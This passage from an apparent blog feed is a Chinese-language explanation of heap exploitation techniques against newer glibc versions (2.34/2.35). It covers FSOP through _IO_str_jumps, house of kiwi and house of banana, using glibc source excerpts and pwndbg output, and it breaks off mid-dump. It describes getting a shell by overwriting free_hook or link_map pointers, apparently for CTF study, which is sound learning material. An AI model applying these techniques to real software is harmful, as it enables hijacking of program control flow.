class=\"line\">  vtable = <span class=\"number\">0x7f85fb7ea0e0</span> &lt;_IO_wfile_jumps+<span class=\"number\">32</span>&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>接下来就是如何触发 exit，利用__malloc_assert 报错，这里可以修改 topchunk 的 size 进行报错。这里依旧可以选择进行 largebin attack. 文章最开始有介绍如何进行连续的两次 attack 。</p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/",
            "url": "http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/",
            "title": "高版本glibc堆的几种利用手法",
            "date_published": "2022-06-03T03:15:34.000Z",
            "content_html": "<h1 id=\"glibc-高版本\"><a class=\"markdownIt-Anchor\" href=\"#glibc-高版本\">#</a> Glibc \t高版本</h1>\n<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言：</h2>\n<p>​\t\t本文旨在讲述在 glibc 2.34ubuntu 高版本下（2.34-0ubuntu3.2）的一些利用手法是否依旧可以使用。会对某些手法进行概括，并没有对其进行深入透彻的讲述。感兴趣的朋友可以自行学习，最后详细介绍了 house of banana.</p>\n<p>我只是站在了前任师傅的高台上，为大家进行一些总结分析。</p>\n<p>​\t\t前不久打算深入的去了解在 2.34 以及 2.35 这两个较高版本的 glibc 的堆漏洞的利用。</p>\n<h2 id=\"234235-如何利用\"><a class=\"markdownIt-Anchor\" href=\"#234235-如何利用\">#</a> 2.34 (2.35) 如何利用</h2>\n<h3 id=\"一些对比\"><a class=\"markdownIt-Anchor\" href=\"#一些对比\">#</a> 一些对比</h3>\n<p>2.34 与 2.35 其实非常接近，一般情况下，我们利用的手法也都是一致的，除了继承了 2.29 以来 的各种保护机制，2.34 开始最大的特点，就是删除了__free_hook</p>\n<p>__malloc_hook</p>\n<p>__realloc_hook</p>\n<p>__memalign_hook</p>\n<p>__after_morecore_hook</p>\n<p>这几个常用的钩子函数，而我们最常用的 malloc_hook 以及 free_hook 被完全的禁止了（虽然我们依旧可以在程序中找到对应的符号，但是相关的函数不在对其进行调用），我们只能另寻出路。其实在 2.29 以后的版本中，很多手法都已经失效了，我们常用的无外乎就是劫持程序执行流，以及输入输出流。在 2.23 的版本中，我们是可以修改 vtable，但是 2.24 后就禁止修改，以及再到后面的一些版本还会检查我们的 vtable 是否在允许的范围中（所有的 vtable 储存在一个数组中，以__start_libc_IO_vtables 开始，__stop_libc_IO_vtables 结束）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_vtable_check (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> SHARED</span></span><br><span class=\"line\">  <span class=\"comment\">/* Honor the compatibility flag.  */</span></span><br><span class=\"line\">  <span class=\"type\">void</span> (*flag) (<span class=\"type\">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (flag);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class=\"line\"><span class=\"comment\">     need to accept foreign vtables because there is always a</span></span><br><span class=\"line\"><span class=\"comment\">     possibility that FILE * objects are passed across the linking</span></span><br><span class=\"line\"><span class=\"comment\">     boundary.  */</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    Dl_info di;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">l</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!rtld_active ()</span><br><span class=\"line\">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class=\"literal\">NULL</span>) != <span class=\"number\">0</span></span><br><span class=\"line\">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>但是，在 2.34 的早期版本又是可以写的（glibc-2.34-0ubuntu1_amd64）</p>\n<p><img data-src=\"p1.jpg\" alt=\"p1\"></p>\n<p>这个时候我们可以尝试攻击 vtable 结构体，达到 getshell 的目的。</p>\n<p>但是在后面的几次更新中，又将修复了这个漏洞，在 (Ubuntu GLIBC 2.34-0ubuntu3.2) 2.34 版本中，就不可以修改（目前已知在 2.340ubuntu3 版本以及之前的版本依旧有可写的权限）</p>\n<p><img data-src=\"p2.png\" alt=\"p2\"></p>\n<p>我们可以找到很多关于如何绕过 vtable check 的办法进行劫持 IO 流，其中最主流的还是利用 _IO_str_jumps  和 _IO_wstr_jumps 两个虚表，</p>\n<p>二者利用几乎一样。我们在源码 /libio/strops.c 可以看到相关的 vatable 的内容，以下我以_IO_str_jumps 作主要说明。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> _<span class=\"title\">IO_str_jumps</span> <span class=\"title\">libio_vtable</span> =</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  JUMP_INIT_DUMMY,</span><br><span class=\"line\">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class=\"line\">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class=\"line\">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class=\"line\">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class=\"line\">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class=\"line\">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class=\"line\">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class=\"line\">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class=\"line\">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class=\"line\">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class=\"line\">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class=\"line\">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class=\"line\">  JUMP_INIT(read, _IO_default_read),</span><br><span class=\"line\">  JUMP_INIT(write, _IO_default_write),</span><br><span class=\"line\">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class=\"line\">  JUMP_INIT(close, _IO_default_close),</span><br><span class=\"line\">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class=\"line\">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class=\"line\">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这里面有两个很有用的函数</p>\n<p>JUMP_INIT(finish, _IO_str_finish),<br>\nJUMP_INIT(overflow, _IO_str_overflow),</p>\n<p>相关源码如下</p>\n<h4 id=\"_io_str_finish\"><a class=\"markdownIt-Anchor\" href=\"#_io_str_finish\">#</a> _IO_str_finish</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Glibc 2.34</span></span><br><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_str_finish (FILE *fp, <span class=\"type\">int</span> dummy)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class=\"line\">    <span class=\"built_in\">free</span> (fp-&gt;_IO_buf_base);</span><br><span class=\"line\">  fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_default_finish (fp, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里我们值得注意的是_IO_str_finish，在之前版本中，函数中其实是存在任意函数执行的漏洞的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Glibc 2.31</span></span><br><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_str_finish (_IO_FILE *fp, <span class=\"type\">int</span> dummy)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class=\"line\">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class=\"comment\">//我们控制 _free_buffer 为目标函数，就达到了任意执行</span></span><br><span class=\"line\">  fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  _IO_default_finish (fp, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是在新版本的函数中，将这部分删除了，所以我们无法通过这里 getshell.</p>\n<h4 id=\"_io_str_overflow\"><a class=\"markdownIt-Anchor\" href=\"#_io_str_overflow\">#</a> _IO_str_overflow</h4>\n<p>2.34 对比之前的版本，这里并没有太大的变化，但是因为没有了 free_hook 事情变得不容乐观</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">_IO_str_overflow (FILE *fp, <span class=\"type\">int</span> c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> flush_only = c == EOF;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> pos;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> flush_only ? <span class=\"number\">0</span> : EOF;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class=\"line\">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (pos &gt;= (<span class=\"type\">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class=\"comment\">/* not allowed to enlarge */</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"type\">char</span> *new_buf;</span><br><span class=\"line\">\t  <span class=\"type\">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">\t  <span class=\"type\">size_t</span> old_blen = _IO_blen (fp);</span><br><span class=\"line\">\t  <span class=\"type\">size_t</span> new_size = <span class=\"number\">2</span> * old_blen + <span class=\"number\">100</span>;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (new_size &lt; old_blen)</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">\t  new_buf = <span class=\"built_in\">malloc</span> (new_size);</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (new_buf == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"comment\">/*\t  __ferror(fp) = 1; */</span></span><br><span class=\"line\">\t      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (old_buf)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"built_in\">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class=\"line\">\t      <span class=\"built_in\">free</span> (old_buf);</span><br><span class=\"line\">\t      <span class=\"comment\">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class=\"line\">\t      fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  <span class=\"built_in\">memset</span> (new_buf + old_blen, <span class=\"string\">&#x27;\\0&#x27;</span>, new_size - old_blen);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  _IO_setb (fp, new_buf, new_buf + new_size, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  fp-&gt;_IO_write_base = new_buf;</span><br><span class=\"line\">\t  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!flush_only)</span><br><span class=\"line\">    *fp-&gt;_IO_write_ptr++ = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) c;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t2.34 前的版本中，我们在利用 FSOP 劫持_IO_list_all 的值来伪造链表和其中的 IO_FILE 项。</p>\n<p>​\t当程序执行 exit 函数，或者从 main 函数返回时，会执行调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。<br>\n因而当设置 stdout 对应的_IO_FILE 对应的 vtable 为 _IO_str_jumps<br>\n 执行 exit 就会执行，_IO_str_overflow,</p>\n<p>利用思路是根据这里面连续的 malloc,memcpy,free，通过控制、伪造 IO_FILE，我们要伪造一个 fake_chunk, 使得函数调用 malloc 时可以得到 fake_chunk, 然后再 fake_chunk 写入我们的数据（来自_IO_buf_base），一般我们把 free_hook 作为 fake_chunk 进行攻击，(这也是攻击陈工的前提)，将 free_hook 覆盖为 system, 执行 system (&quot;/bin/sh&quot;). 这里我们布置的时 fake_chunk 的用户区域为 free_hook-0x10, 这样，_IO_buf_base 的前 8 字节为”/bin/sh\\x00“, 接下来的 8 字节时 system 的地址，这样 free (fake_chunk) ===&gt;system (fakechunk), 完成了 free_hook 的覆盖以及 getshell。</p>\n<h4 id=\"house-of-kiwi\"><a class=\"markdownIt-Anchor\" href=\"#house-of-kiwi\">#</a> house of kiwi</h4>\n<p>当程序没有显示调用 exit，也不会通过主函数返回，那么以往我们使用的 FSOP 就无法进行了，如果此时两个 hook 也没法利用，我们需要一种能够稳定触发 IO 中函数的路径，这就是 house of kiwi, 它利用了__malloc_assert.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span></span><br><span class=\"line\">__malloc_assert (<span class=\"type\">const</span> <span class=\"type\">char</span> *assertion, <span class=\"type\">const</span> <span class=\"type\">char</span> *file, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> line,</span><br><span class=\"line\">\t\t <span class=\"type\">const</span> <span class=\"type\">char</span> *function)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  (<span class=\"type\">void</span>) __fxprintf (<span class=\"literal\">NULL</span>, <span class=\"string\">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n&quot;</span>,</span><br><span class=\"line\">\t\t     __progname, __progname[<span class=\"number\">0</span>] ? <span class=\"string\">&quot;: &quot;</span> : <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">\t\t     file, line,</span><br><span class=\"line\">\t\t     function ? function : <span class=\"string\">&quot;&quot;</span>, function ? <span class=\"string\">&quot;: &quot;</span> : <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">\t\t     assertion);</span><br><span class=\"line\">  fflush (<span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"built_in\">abort</span> ();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从源码中可以看到这个断言中调用了 fflush (stderr)，这个函数会稳定的调用_IO_file_jumps 中的 sync<br>\n 在 house of kiwi 中，如果我们能实现一个任意地址写，那么就可以修改 sync 指针，并且在调用的时候还发现，rdx 也很稳定的是 IO_helper_jumps，此时如果我们通过任意地址写将 sync 指针改成 IO_helper_jumps，且将 IO_helper_jumps+0xa0 和 IO_helper_jumps+0xa8 改写，就可以实现栈迁移 orw。在更新的版本中，相关的虚表已经不可以写了。</p>\n<h4 id=\"小结\"><a class=\"markdownIt-Anchor\" href=\"#小结\">#</a> 小结：</h4>\n<p>但是这些 2.34 更新的版本中（比如 glibcubuntu3.2）下都失效了，因为没有了 free_hook，也就没有了上述的一系列手法，而且以上依赖 fflush () 函数，通常我们需要利用 exit 函数来执行该调用。到此我们宣告上述利用手法，失效。但是比赛目前还没有变态到这种程度，常见的还是 2.34 的早期版本上述手法部分依旧可以实现。</p>\n<h2 id=\"解决方案\"><a class=\"markdownIt-Anchor\" href=\"#解决方案\">#</a> 解决方案</h2>\n<p>难道 pwn 到此就结束了吗？我们回头梳理下，以上攻击方式失败的原因，无外乎就是没有了 hook 函数以及 vtable 不可写。但是我们回到最开始学习 pwn，其实最简单的还是 rop, 在高版本中我们是否可以结合 stack 与 heap 的攻击？或者我们是否还有其他的办法劫持程序的控制流？</p>\n<h3 id=\"house-of-banana\"><a class=\"markdownIt-Anchor\" href=\"#house-of-banana\">#</a> house of banana</h3>\n<p>house of banana 是 ha1vk 师傅在 2020 年总结出来的利用链。不同于_IO_IO_str   和_overflow,_IO_str_overflow。banana 攻击的是 rtld_global 结构体中的 link_map 指针，</p>\n<p>攻击的位置 houm 是在程序结束后调用 exit，或者程序由 libc_start_main 启动，并且主函数可以正常结束返回。（这里提到了 exit，不得不提一下以往的攻击 exit_hook，配合 onegadget 获得 shell，目前为止，到 glibc2.34ubuntu3 依旧可以利用，但是在 3.2 版本下该地址没有了可写权限，所以失效了）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//2.34 0ubuntu3.2</span></span><br><span class=\"line\">RAX  <span class=\"number\">0x1</span></span><br><span class=\"line\"> RBX  <span class=\"number\">0x7ffff7fad9f8</span> (__elf_set___libc_atexit_element__IO_cleanup__) —▸ <span class=\"number\">0x7ffff7e26b10</span> (_IO_cleanup) ◂— endbr64 </span><br><span class=\"line\"> RCX  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RDX  <span class=\"number\">0x1</span></span><br><span class=\"line\"> RDI  <span class=\"number\">0x555555558148</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">```</span><br><span class=\"line\"><span class=\"number\">0x7ffff7ddd58f</span> &lt;__run_exit_handlers+<span class=\"number\">431</span>&gt;    nop    </span><br><span class=\"line\"> ► <span class=\"number\">0x7ffff7ddd590</span> &lt;__run_exit_handlers+<span class=\"number\">432</span>&gt;    call   qword ptr [rbx]               &lt;_IO_cleanup&gt;</span><br><span class=\"line\">        rdi: <span class=\"number\">0x555555558148</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">        rsi: <span class=\"number\">0x0</span></span><br><span class=\"line\">        rdx: <span class=\"number\">0x1</span></span><br><span class=\"line\">        rcx: <span class=\"number\">0x0</span></span><br><span class=\"line\">```</span><br><span class=\"line\">pwndbg&gt; vmmap <span class=\"number\">0x7ffff7fad9f8</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7fad000</span>     <span class=\"number\">0x7ffff7fb1000</span> r--p     <span class=\"number\">4000</span> <span class=\"number\">214000</span> /usr/lib/x86_64-linux-gnu/libc.so<span class=\"number\">.6</span> +<span class=\"number\">0x9f8</span></span><br><span class=\"line\">pwndbg&gt; x <span class=\"number\">0x7ffff7fad9f8</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7fad9f8</span> &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;:\t<span class=\"number\">0xf7e26b10</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>house of banana 相较于以往的攻击手法，其实思路很明确。在程序通过显式调用 exit，或者 main 函数是由__libc_start_main 唤起，并可以正常的返回时，由于动态链接的加载机制，程序中并没有 exit 函数的真实调用，而是要通过符号表来获得真实的函数地址。（有关动态链接延迟绑定的技术，还请自行查阅，这里不做过多的阐述。）我们联想到 ret2_dl_resolve 技术。</p>\n<p>下面是 exit 执行的一个过程</p>\n<h5 id=\"exit-_dl_fini-fini_t-arrayi\"><a class=\"markdownIt-Anchor\" href=\"#exit-_dl_fini-fini_t-arrayi\">#</a> exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();</h5>\n<p>​\t\tbanana 手法，通过伪造修改相关的表项，以达到调用后门来获得权限。这里我们重点说一下，在 ubuntu3.2 下利用的可行性。大多数师傅对于 banana 的攻击方式主要有两种，一是攻击_rtld_global 这个全局符号所保存的 link_map 的链表。伪造整个链表，进行劫持。相关的全局变量是可以写的。后面会解释这个变量的用处。</p>\n<p><img data-src=\"p3.png\" alt=\"p3\"></p>\n<p>另外一个与之相比破坏性比较小，更容易成功。由于 link_map 通过链表链接，但是在加载 exit 的时候，相关函数智慧通过 link_map-&gt;l_next 指针进行相关的检查。我们可以在某个特定的位置，更改 next 指针，将下一以链表节点转为我们控制的地方，比如 heap 上。</p>\n<p>​\t很多朋友看了上面的可能会比较蒙，下面我具体说一参数。</p>\n<p>关于 link_map, 我们攻击 exit 时，会使用到一个 link_map 的链表，链表的一些信息保存在 struct rtld_global 结构体中，这个结构体信息很多，很繁杂，但是 banana 只用到了几个关键的点。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_rtld_global</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> rtld_global *) <span class=\"number\">0x7f56e43b9040</span> &lt;_rtld_global&gt;</span><br><span class=\"line\">    <span class=\"comment\">//以下是结构体信息的展开，pwndbg为我们做了整理</span></span><br><span class=\"line\">pwndbg&gt; p _rtld_global</span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  _dl_ns = &#123;&#123;</span><br><span class=\"line\">      _ns_loaded = <span class=\"number\">0x7f56e43ba220</span>,\t\t\t\t<span class=\"comment\">//#1</span></span><br><span class=\"line\">      _ns_nloaded = <span class=\"number\">4</span>,\t\t\t\t\t\t<span 